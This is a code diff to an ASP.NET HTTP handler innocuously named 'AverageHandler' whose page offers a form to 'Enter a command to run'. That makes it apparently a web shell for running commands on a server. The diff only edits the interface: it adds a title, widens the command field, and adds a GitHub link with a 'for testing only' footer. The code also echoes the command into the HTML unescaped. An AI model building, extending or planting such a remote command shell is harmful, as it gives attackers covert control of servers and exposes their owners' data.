@@ -38,6 +38,7 @@ public class AverageHandler : IHttpHandler
 		ctx.Response.Write(@"
 			<html>
 			<head>
+			<title>kev-got-a-bang</title>
 				<style>
 					body {
 						font-family: Arial, sans-serif;
@@ -64,7 +65,7 @@ public class AverageHandler : IHttpHandler
 
 				<form method='GET'>
 					<label for='cmd'>Enter a command to run:</label>
-					<input type='text' size='50' name='cmd' value='" + command + @"'>
+					<input type='text' size='200' name='cmd' value='" + command + @"'>
 					<input type='submit' value='Run'>
 				</form>
 				<hr>
@@ -119,7 +120,8 @@ public class AverageHandler : IHttpHandler
 		
 		ctx.Response.Write(@"</pre>
 				<hr>
-				<p>Footer content here</p>
+				<p>i'm here to <a href=https://github.com/nvth>help</a></p>
+				<p>for testing only</p>
 			</body>
 			</html>");
     }
